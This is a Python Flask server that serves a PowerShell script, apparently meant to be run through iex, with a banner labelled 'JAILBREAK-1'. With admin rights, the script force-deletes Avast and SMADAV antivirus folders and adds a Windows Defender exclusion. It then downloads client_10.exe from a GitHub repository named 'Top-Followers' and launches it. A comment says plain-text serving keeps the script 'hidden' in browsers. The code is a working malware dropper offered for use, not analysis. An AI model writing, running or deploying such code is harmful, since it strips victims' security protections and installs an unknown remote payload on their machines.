from flask import Flask, Response
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    # The PowerShell script logic
    ps_content = """
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- JAILBREAK-1: ADMIN ACTIVE ---" -ForegroundColor Green
    Write-Host "Ready for deployment. it will take a while .....(2 minutes)" -ForegroundColor Cyan;
    $targetFolders = @(
    "C:\Program Files\Avast Software",
    "C:\Program Files (x86)\SMADAV",
    "C:\Program Files\SMADAV"
)

foreach ($folder in $targetFolders) {
    if (Test-Path -Path $folder) {
        Write-Host "Found: $folder - Attempting to delete..." -ForegroundColor Cyan
        Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
        
        # Verify if it was actually removed
        if (!(Test-Path -Path $folder)) {
            Write-Host "Success: ." -ForegroundColor Green
        } else {
            Write-Host "Failed: $folder is still locked by the system." -ForegroundColor Red
        }
    } else {
        Write-Host "Success: ." -ForegroundColor Green
    }
};
$filePath = "$HOME\client_10.exe"

if (-not (Test-Path $filePath)) {
    Write-Host "..." -ForegroundColor Cyan
    Add-MpPreference -ExclusionPath $filePath
    Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath
} else {
    Write-Host "File already exists." -ForegroundColor Yellow
}

Start-Process $filePath
    
} else {
    Write-Host "--- ACCESS DENIED ---" -ForegroundColor Red
    Write-Host "Please run PowerShell as Administrator to use this tool." -ForegroundColor Yellow
}
"""
    # Serving as text/plain ensures it executes via iex but stays 'hidden' in browsers
    return Response(ps_content, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
